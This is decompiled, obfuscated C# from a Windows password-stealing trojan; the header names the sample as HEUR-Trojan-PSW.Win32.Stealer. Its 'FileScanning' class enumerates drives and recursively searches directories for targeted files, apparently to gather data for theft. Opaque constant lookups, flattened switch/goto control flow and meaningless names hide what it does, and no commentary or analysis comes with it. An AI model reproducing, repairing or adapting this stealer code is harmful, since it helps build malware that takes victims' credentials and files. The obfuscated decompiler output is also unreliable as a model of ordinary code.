// Decompiled with JetBrains decompiler
// Type: FileScanning
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.IO;

public static class FileScanning
{
  public static List<Entity5> Search(params FileScanner[] scanners)
  {
    List<Entity5> entity5List = DriveList.RegisterFile();
    try
    {
      FileScanner[] fileScannerArray = scanners;
      for (int index1 = TemplateService.RegisterFile(3368); index1 < fileScannerArray.Length; index1 += TemplateService.RegisterFile(3388))
      {
        FileScanner pathList1 = fileScannerArray[index1];
        try
        {
          IEnumerator<Entity16> pathList2 = WindowSite.RegisterFile((object) FunctionSite.RegisterFile((object) pathList1));
          try
          {
            while (RegistryContext.RegisterFile((object) pathList2))
            {
              Entity16 entity16 = StoreList.RegisterFile((object) pathList2);
              try
              {
                DirectoryInfo pathList3 = ActionInfo.RegisterFile(NodeConverter.RegisterFile((object) entity16));
                string generatorCache1 = ClientSite.RegisterFile((object) entity16);
                int previousHandler;
                if (!PaneDictionary.RegisterFile((object) entity16))
                {
label_7:
                  switch (3)
                  {
                    case 0:
                      goto label_7;
                    default:
                      if (false)
                      {
                        // ISSUE: method reference
                        RuntimeMethodHandle runtimeMethodHandle = __methodref (FileScanning.Search);
                      }
                      previousHandler = TemplateService.RegisterFile(3372);
                      break;
                  }
                }
                else
                  previousHandler = TemplateService.RegisterFile(3376);
                FileInfo[] fileInfoArray = StreamStack.RegisterFile((object) pathList3, generatorCache1, (SearchOption) previousHandler);
                for (int index2 = TemplateService.RegisterFile(3380); index2 < fileInfoArray.Length; index2 += TemplateService.RegisterFile(3384))
                {
                  FileInfo fileInfo = fileInfoArray[index2];
                  try
                  {
                    List<Entity5> pathList4 = entity5List;
                    Entity5 entity5 = SelectionSite.RegisterFile(PcitureSettings.RegisterFile((object) fileInfo));
                    ReferenceOptions.RegisterFile((object) entity5, ToolboxDesigner.RegisterFile((object) pathList1, entity16, fileInfo));
                    string generatorCache2;
                    if (!StreamStream.RegisterFile(StubDesigner.RegisterFile((object) pathList1)))
                    {
label_15:
                      switch (4)
                      {
                        case 0:
                          goto label_15;
                        default:
                          generatorCache2 = StubDesigner.RegisterFile((object) pathList1);
                          break;
                      }
                    }
                    else
                      generatorCache2 = BitmapContext.RegisterFile((object) entity16);
                    SymbolService.RegisterFile((object) entity5, generatorCache2);
                    XmlFileTree.RegisterFile((object) pathList4, entity5);
                  }
                  catch (Exception ex)
                  {
                  }
                }
label_22:
                switch (5)
                {
                  case 0:
                    goto label_22;
                  default:
                    continue;
                }
              }
              catch
              {
              }
            }
label_25:
            switch (6)
            {
              case 0:
                goto label_25;
              default:
                continue;
            }
          }
          finally
          {
            if (pathList2 != null)
            {
label_27:
              switch (6)
              {
                case 0:
                  goto label_27;
                default:
                  DeploymentDesigner.RegisterFile((object) pathList2);
                  break;
              }
            }
          }
        }
        catch
        {
        }
      }
label_33:
      switch (4)
      {
        case 0:
          goto label_33;
      }
    }
    catch
    {
    }
    return entity5List;
  }

  public static List<string> FindPaths(
    string baseDirectory,
    int maxLevel = 4,
    int level = 1,
    params string[] files)
  {
    List<string> stringList = TemplateHelper.RegisterFile();
    List<string> pathList1 = stringList;
    char[] pathList2 = new char[TemplateService.RegisterFile(3392)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList2, __fieldref (VectorContext.previousHandler));
    string generatorCache1 = TreeNodeType.RegisterFile(pathList2);
    PageHelper.RegisterFile((object) pathList1, generatorCache1);
    List<string> pathList3 = stringList;
    char[] pathList4 = new char[TemplateService.RegisterFile(3396)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList4, __fieldref (VectorContext.namesEnabled));
    string generatorCache2 = TreeNodeType.RegisterFile(pathList4);
    PageHelper.RegisterFile((object) pathList3, generatorCache2);
    List<string> pathList5 = stringList;
    char[] pathList6 = new char[TemplateService.RegisterFile(3400)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList6, __fieldref (VectorContext.pathList));
    string generatorCache3 = TreeNodeType.RegisterFile(pathList6);
    PageHelper.RegisterFile((object) pathList5, generatorCache3);
    List<string> pathList7 = stringList;
    char[] pathList8 = new char[TemplateService.RegisterFile(3404)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList8, __fieldref (VectorContext.namesEnabled));
    string generatorCache4 = TreeNodeType.RegisterFile(pathList8);
    PageHelper.RegisterFile((object) pathList7, generatorCache4);
    List<string> pathList9 = stringList;
    List<string> pathList10 = TemplateHelper.RegisterFile();
    if (files != null)
    {
label_1:
      switch (5)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (FileScanning.FindPaths);
          }
          if (files.Length != 0)
          {
label_5:
            switch (7)
            {
              case 0:
                goto label_5;
              default:
                if (level > maxLevel)
                {
label_7:
                  switch (7)
                  {
                    case 0:
                      goto label_7;
                  }
                }
                else
                {
                  try
                  {
                    string[] strArray = ReferenceEditor.RegisterFile(baseDirectory);
                    for (int index1 = TemplateService.RegisterFile(3408); index1 < strArray.Length; index1 += TemplateService.RegisterFile(3448))
                    {
                      string pathList11 = strArray[index1];
                      bool flag1 = TemplateService.RegisterFile(3412) != 0;
                      using (List<string>.Enumerator pathList12 = OutlineLoader.RegisterFile((object) pathList9))
                      {
                        while (SymbolToken.RegisterFile(ref pathList12))
                        {
                          string generatorCache5 = SolutionList.RegisterFile(ref pathList12);
                          if (SolutionSet.RegisterFile((object) pathList11, generatorCache5))
                          {
label_13:
                            switch (6)
                            {
                              case 0:
                                goto label_13;
                              default:
                                flag1 = TemplateService.RegisterFile(3416) != 0;
                                goto label_18;
                            }
                          }
                        }
label_16:
                        switch (2)
                        {
                          case 0:
                            goto label_16;
                        }
                      }
label_18:
                      if (!flag1)
                      {
label_19:
                        switch (1)
                        {
                          case 0:
                            goto label_19;
                          default:
                            try
                            {
                              DirectoryInfo pathList13 = ActionInfo.RegisterFile(pathList11);
                              FileInfo[] fileInfoArray = AddinList.RegisterFile((object) pathList13);
                              bool flag2 = TemplateService.RegisterFile(3420) != 0;
label_33:
                              for (int index2 = TemplateService.RegisterFile(3424); index2 < fileInfoArray.Length; index2 += TemplateService.RegisterFile(3440))
                              {
                                if (!flag2)
                                {
label_22:
                                  switch (4)
                                  {
                                    case 0:
                                      goto label_22;
                                    default:
                                      for (int index3 = TemplateService.RegisterFile(3428); index3 < files.Length; index3 += TemplateService.RegisterFile(3436))
                                      {
                                        if (!flag2)
                                        {
label_25:
                                          switch (5)
                                          {
                                            case 0:
                                              goto label_25;
                                            default:
                                              string file = files[index3];
                                              FileInfo pathList14 = fileInfoArray[index2];
                                              string generatorCache6 = ConditionStream.RegisterFile((object) pathList14);
                                              if (PaneService.RegisterFile(file, generatorCache6))
                                              {
label_27:
                                                switch (1)
                                                {
                                                  case 0:
                                                    goto label_27;
                                                  default:
                                                    flag2 = TemplateService.RegisterFile(3432) != 0;
                                                    PageHelper.RegisterFile((object) pathList10, PcitureSettings.RegisterFile((object) pathList14));
                                                    continue;
                                                }
                                              }
                                              else
                                                continue;
                                          }
                                        }
                                        else
                                          goto label_33;
                                      }
label_31:
                                      switch (2)
                                      {
                                        case 0:
                                          goto label_31;
                                        default:
                                          continue;
                                      }
                                  }
                                }
                                else
                                  goto label_35;
                              }
label_34:
                              switch (7)
                              {
                                case 0:
                                  goto label_34;
                              }
label_35:
                              using (List<string>.Enumerator pathList15 = OutlineLoader.RegisterFile((object) ServerSite.RegisterFile(PcitureSettings.RegisterFile((object) pathList13), maxLevel, level + TemplateService.RegisterFile(3444), files)))
                              {
                                while (SymbolToken.RegisterFile(ref pathList15))
                                {
                                  string generatorCache7 = SolutionList.RegisterFile(ref pathList15);
                                  if (!VectorHelper.RegisterFile((object) pathList10, generatorCache7))
                                  {
label_38:
                                    switch (4)
                                    {
                                      case 0:
                                        goto label_38;
                                      default:
                                        PageHelper.RegisterFile((object) pathList10, generatorCache7);
                                        continue;
                                    }
                                  }
                                }
label_41:
                                switch (5)
                                {
                                  case 0:
                                    goto label_41;
                                }
                              }
                              continue;
                            }
                            catch
                            {
                              continue;
                            }
                        }
                      }
                    }
label_47:
                    switch (1)
                    {
                      case 0:
                        goto label_47;
                    }
                  }
                  catch
                  {
                  }
                  return pathList10;
                }
                break;
            }
          }
          else
            break;
      }
    }
    return pathList10;
  }
}
